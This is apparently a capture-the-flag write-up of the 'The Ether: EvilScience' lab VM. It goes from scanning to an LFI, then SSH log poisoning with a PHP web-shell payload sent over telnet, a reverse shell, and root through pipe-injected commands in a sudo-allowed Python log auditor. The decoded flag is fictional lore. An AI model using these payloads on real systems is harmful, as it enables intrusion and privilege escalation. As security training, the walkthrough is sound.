# The Ether: EvilScience (v1.0.1) Writeup

First , we run a network scan
```bash
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                    
                                                                                                                                                                                                                  
 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                                                                                                                                  
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.111.157.53   f6:b6:81:a5:a1:8e      1      60  Unknown vendor                                                                                                                                                 
 10.111.157.58   d8:a8:81:42:0c:eb      1      60  Unknown vendor                                                                                                                                                 
 10.111.157.139  00:0c:29:30:38:ee      1      60  VMware, Inc.
```
\
Next, Open Ports scanning
```bash
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```
\
After accessing port 80 on browser , i checked source code and i found
```bash
div class="wrapper row2">
  <nav id="mainav" class="hoc clear"> 
    <!-- ################################################################################################ -->
    <ul class="clear">
      <li class="active"><a href="index.php">Home</a></li>
      <li><a href="?file=about.php">About Us</a></li>
      <li><a href="?file=research.php">Research</a></li>
    </ul>
    <!-- ################################################################################################ -->
  </nav>
```
\
So we can see that there is a LFI vulnerability here
\
After bruteforcing a bit for LFI checking , i found this file '/var/log/auth.log'
\
So i thought about PHP Log Poisoning , So to check i tried a wrong password for ssh
```bash
ssh root@10.111.157.139                                      
The authenticity of host '10.111.157.139 (10.111.157.139)' can't be established.
ED25519 key fingerprint is SHA256:A2ppLqZIgajFCD6dE0G+eokJmp5p1hlXEFb2V1v+fng.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:61: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.111.157.139' (ED25519) to the list of known hosts.
root@10.111.157.139's password: 
Permission denied, please try again.
```
\
and When i checked the log 
```bash
Jan 22 06:17:01 theEther CRON[1711]: pam_unix(cron:session): session opened for user root by (uid=0)
Jan 22 06:17:01 theEther CRON[1711]: pam_unix(cron:session): session closed for user root
Jan 22 06:21:19 theEther sshd[1748]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=10.111.157.14  user=root
Jan 22 06:21:21 theEther sshd[1748]: Failed password for root from 10.111.157.14 port 45960 ssh2
Jan 22 06:21:22 theEther sshd[1748]: Connection closed by 10.111.157.14 port 45960 [preauth]
```
\
We can see the log of that login attempt, So now i try to connect using telnet and use a php function instead of a username
```bash
telnet 10.111.157.139 22   
Trying 10.111.157.139...
Connected to 10.111.157.139.
Escape character is '^]'.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
<?php system($_GET["c"]);?>
Protocol mismatch.
Connection closed by foreign host.
```
\
Now if we check the log file with a query parameter c=id, We see 
\
<img width="1365" height="515" alt="image" src="https://github.com/user-attachments/assets/dcad55ff-03ea-4d24-8261-5198126e32ea" />
\
So we successfully got code execution , So now switchign to shell
```bash
penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 10.111.157.14
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from theEther~10.111.157.139-Linux-i686 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/theEther~10.111.157.139-Linux-i686/2026_01_22-09_27_05-643.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@theEther:/var/www/html/theEther.com/public_html$ 
```
\
Now i check for sudo permissions
```bash
sudo -l
sudo: unable to resolve host theEther
Matching Defaults entries for www-data on theEther:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on theEther:
    (ALL) NOPASSWD: /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
    (root) NOPASSWD: /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
```
\
We see that the file has a large amount of encoded data in a variable magic , So i am not pasting that here
```bash
love = 'I5AHIYrHqUZRkdpxgWI1cVZH9XrTqKGHuwAHugFIuTHatjpRukE25IImASFxIdFTS4n293G0SOrQOdGGSSIRMYH0ySHayYFGO5qHpkGIWTraSzEJS1E0cIG0ylFHSeJaq5IRHjqGIiHx1VERuenxHjBIEXrUIKFHujn3OXAJ5VrUyMEHqCq1cXBGEkE0SJJxgGE3O5EJgA$
god = 'RmxyV21Gak1XUjFZa1pvYUUxWVFsVlhWbHByVWpBMWMxZHVVbEJXYlZKWVZGUkNTMVJXV2toa1IwWm9UVlZzTkZkclduTlpWa3AwVlcwNVZWWkZXa3hXTW5oaFYwVXhWVlZ0ZEU1U1JWcEpWbXhrTkZsWFJrZFRhbHBwVW5wc1ZsWnNXa3RUUmxsM1YyeGthMUl3TlVoV1I$
destiny = 'MWDJkWFHSWEHbkD0EVGIyVZKIGEacOFRMVrH9WFRx0pHqGHxMFZH1TE1AOowOAIxMVL1IVraNkEyW1I0y4ZJqVZKShFQOGF0I4pHqnFRIKGQSAoRMuFHuTFTqUFHuAIHpkpIqnIKyuEySGq0yFrHMVZUIdFHgVn0MUGmOhrUSIEHceIRyWDIIjIKHkDIAwIaOWGJgTH$
joy = '\x72\x6f\x74\x31\x33'            
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x6$
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
```
\
As for the remaining part , we see that the python script runs eval , so lets try to execute the script and check
```bash
sudo /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
sudo: unable to resolve host theEther
===============================
Log Auditor
===============================
Logs available
-------------------------------
/var/log/auth.log
/var/log/apache2/access.log
-------------------------------

Load which log?:
```
\
We can see that , the commands are beinge executed by root
```bash
Log Auditor
===============================
Logs available
-------------------------------
/var/log/auth.log
/var/log/apache2/access.log
-------------------------------

Load which log?: /var/log/auth.log | id
uid=0(root) gid=0(root) groups=0(root)
```
\
I tried converting into root shell , but the shell opened as another session, so i couldnt get it this way
```bash
Load which log?: /var/log/auth.log | /bin/bash
/bin/bash: line 1: syntax error near unexpected token `('
/bin/bash: line 1: `Jan 22 06:17:01 theEther CRON[1711]: pam_unix(cron:session): session opened for user root by (uid=0)'
www-data@theEther:/var/www/html/theEther.com/public_html$ sudo /var/www/html/theEther.com/public_html/xxxlogauditorxxx.py
sudo: unable to resolve host theEther
===============================
Log Auditor
===============================
Logs available
-------------------------------
/var/log/auth.log
/var/log/apache2/access.log
-------------------------------

Load which log?: /var/log/auth.log | /bin/bash -p
/bin/bash: line 1: syntax error near unexpected token `('
/bin/bash: line 1: `Jan 22 06:17:01 theEther CRON[1711]: pam_unix(cron:session): session opened for user root by (uid=0)'
```
\
So lets just get a reverse shell to another port
```bash
penelope -p 4445
[+] Listening for reverse shells on 0.0.0.0:4445 →  127.0.0.1 • 192.168.0.105
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from theEther~192.168.0.104-Linux-i686 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/theEther~192.168.0.104-Linux-i686/2026_01_23-01_32_57-975.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
root@theEther:/var/www/html/theEther.com/public_html# cd /root
root@theEther:~# ls -la
total 232
drwx------  5 root root   4096 Oct 24  2017 .
drwxr-xr-x 23 root root   4096 Nov 22  2017 ..
-rw-------  1 root root   5462 Jan 22 22:29 .bash_history
-rw-r--r--  1 root root   3106 Oct 22  2015 .bashrc
drwx------  2 root root   4096 Aug  1  2017 .cache
drwx------  3 root root   4096 Oct 24  2017 .gnupg
drwxr-xr-x  2 root root   4096 Oct 22  2017 .nano
-rw-r--r--  1 root root    148 Aug 17  2015 .profile
-rw-rw-r--  1 root root 197712 Oct 24  2017 flag.png
```
\
And we get shell as root, and to check flag.png , i run strings on it
```bash
flag: b2N0b2JlciAxLCAyMDE3LgpXZSBoYXZlIG9yIGZpcnN0IGJhdGNoIG9mIHZvbHVudGVlcnMgZm9yIHRoZSBnZW5vbWUgcHJvamVjdC4gVGhlIGdyb3VwIGxvb2tzIHByb21pc2luZywgd2UgaGF2ZSBoaWdoIGhvcGVzIGZvciB0aGlzIQoKT2N0b2JlciAzLCAyMDE3LgpUaGUgZmlyc3QgaHVtYW4gdGVzdCB3YXMgY29uZHVjdGVkLiBPdXIgc3VyZ2VvbnMgaGF2ZSBpbmplY3RlZCBhIGZlbWFsZSBzdWJqZWN0IHdpdGggdGhlIGZpcnN0IHN0cmFpbiBvZiBhIGJlbmlnbiB2aXJ1cy4gTm8gcmVhY3Rpb25zIGF0IHRoaXMgdGltZSBmcm9tIHRoaXMgcGF0aWVudC4KCk9jdG9iZXIgMywgMjAxNy4KU29tZXRoaW5nIGhhcyBnb25lIHdyb25nLiBBZnRlciBhIGZldyBob3VycyBvZiBpbmplY3Rpb24sIHRoZSBodW1hbiBzcGVjaW1lbiBhcHBlYXJzIHN5bXB0b21hdGljLCBleGhpYml0aW5nIGRlbWVudGlhLCBoYWxsdWNpbmF0aW9ucywgc3dlYXRpbmcsIGZvYW1pbmcgb2YgdGhlIG1vdXRoLCBhbmQgcmFwaWQgZ3Jvd3RoIG9mIGNhbmluZSB0ZWV0aCBhbmQgbmFpbHMuCgpPY3RvYmVyIDQsIDIwMTcuCk9ic2VydmluZyBvdGhlciBjYW5kaWRhdGVzIHJlYWN0IHRvIHRoZSBpbmplY3Rpb25zLiBUaGUgZXRoZXIgc2VlbXMgdG8gd29yayBmb3Igc29tZSBidXQgbm90IGZvciBvdGhlcnMuIEtlZXBpbmcgY2xvc2Ugb2JzZXJ2YXRpb24gb24gZmVtYWxlIHNwZWNpbWVuIG9uIE9jdG9iZXIgM3JkLgoKT2N0b2JlciA3LCAyMDE3LgpUaGUgZmlyc3QgZmxhdGxpbmUgb2YgdGhlIHNlcmllcyBvY2N1cnJlZC4gVGhlIGZlbWFsZSBzdWJqZWN0IHBhc3NlZC4gQWZ0ZXIgZGVjcmVhc2luZywgbXVzY2xlIGNvbnRyYWN0aW9ucyBhbmQgbGlmZS1saWtlIGJlaGF2aW9ycyBhcmUgc3RpbGwgdmlzaWJsZS4gVGhpcyBpcyBpbXBvc3NpYmxlISBTcGVjaW1lbiBoYXMgYmVlbiBtb3ZlZCB0byBhIGNvbnRhaW5tZW50IHF1YXJhbnRpbmUgZm9yIGZ1cnRoZXIgZXZhbHVhdGlvbi4KCk9jdG9iZXIgOCwgMjAxNy4KT3RoZXIgY2FuZGlkYXRlcyBhcmUgYmVnaW5uaW5nIHRvIGV4aGliaXQgc2ltaWxhciBzeW1wdG9tcyBhbmQgcGF0dGVybnMgYXMgZmVtYWxlIHNwZWNpbWVuLiBQbGFubmluZyB0byBtb3ZlIHRoZW0gdG8gcXVhcmFudGluZSBhcyB3ZWxsLgoKT2N0b2JlciAxMCwgMjAxNy4KSXNvbGF0ZWQgYW5kIGV4cG9zZWQgc3ViamVjdCBhcmUgZGVhZCwgY29sZCwgbW92aW5nLCBnbmFybGluZywgYW5kIGF0dHJhY3RlZCB0byBmbGVzaCBhbmQvb3IgYmxvb2QuIENhbm5pYmFsaXN0aWMtbGlrZSBiZWhhdmlvdXIgZGV0ZWN0ZWQuIEFuIGFudGlkb3RlL3ZhY2NpbmUgaGFzIGJlZW4gcHJvcG9zZWQuCgpPY3RvYmVyIDExLCAyMDE3LgpIdW5kcmVkcyBvZiBwZW9wbGUgaGF2ZSBiZWVuIGJ1cm5lZCBhbmQgYnVyaWVkIGR1ZSB0byB0aGUgc2lkZSBlZmZlY3RzIG9mIHRoZSBldGhlci4gVGhlIGJ1aWxkaW5nIHdpbGwgYmUgYnVybmVkIGFsb25nIHdpdGggdGhlIGV4cGVyaW1lbnRzIGNvbmR1Y3RlZCB0byBjb3ZlciB1cCB0aGUgc3RvcnkuCgpPY3RvYmVyIDEzLCAyMDE3LgpXZSBoYXZlIGRlY2lkZWQgdG8gc3RvcCBjb25kdWN0aW5nIHRoZXNlIGV4cGVyaW1lbnRzIGR1ZSB0byB0aGUgbGFjayBvZiBhbnRpZG90ZSBvciBldGhlci4gVGhlIG1haW4gcmVhc29uIGJlaW5nIHRoZSBudW1lcm91cyBkZWF0aCBkdWUgdG8gdGhlIHN1YmplY3RzIGRpc3BsYXlpbmcgZXh0cmVtZSByZWFjdGlvbnMgdGhlIHRoZSBlbmdpbmVlcmVkIHZpcnVzLiBObyBwdWJsaWMgYW5ub3VuY2VtZW50IGhhcyBiZWVuIGRlY2xhcmVkLiBUaGUgQ0RDIGhhcyBiZWVuIHN1c3BpY2lvdXMgb2Ygb3VyIHRlc3RpbmdzIGFuZCBhcmUgY29uc2lkZXJpbmcgbWFydGlhbCBsYXdzIGluIHRoZSBldmVudCBvZiBhbiBvdXRicmVhayB0byB0aGUgZ2VuZXJhbCBwb3B1bGF0aW9uLgoKLS1Eb2N1bWVudCBzY2hlZHVsZWQgdG8gYmUgc2hyZWRkZWQgb24gT2N0b2JlciAxNXRoIGFmdGVyIFBTQS4K
```
\
After decoding it from base64 , we get 
```bash
october 1, 2017.
We have or first batch of volunteers for the genome project. The group looks promising, we have high hopes for this!

October 3, 2017.
The first human test was conducted. Our surgeons have injected a female subject with the first strain of a benign virus. No reactions at this time from this patient.

October 3, 2017.
Something has gone wrong. After a few hours of injection, the human specimen appears symptomatic, exhibiting dementia, hallucinations, sweating, foaming of the mouth, and rapid growth of canine teeth and nails.

October 4, 2017.
Observing other candidates react to the injections. The ether seems to work for some but not for others. Keeping close observation on female specimen on October 3rd.

October 7, 2017.
The first flatline of the series occurred. The female subject passed. After decreasing, muscle contractions and life-like behaviors are still visible. This is impossible! Specimen has been moved to a containment quarantine for further evaluation.

October 8, 2017.
Other candidates are beginning to exhibit similar symptoms and patterns as female specimen. Planning to move them to quarantine as well.

October 10, 2017.
Isolated and exposed subject are dead, cold, moving, gnarling, and attracted to flesh and/or blood. Cannibalistic-like behaviour detected. An antidote/vaccine has been proposed.

October 11, 2017.
Hundreds of people have been burned and buried due to the side effects of the ether. The building will be burned along with the experiments conducted to cover up the story.

October 13, 2017.
We have decided to stop conducting these experiments due to the lack of antidote or ether. The main reason being the numerous death due to the subjects displaying extreme reactions the the engineered virus. No public announcement has been declared. The CDC has been suspicious of our testings and are considering martial laws in the event of an outbreak to the general population.

--Document scheduled to be shredded on October 15th after PSA.
```
\
The End , Thank you for reading till here
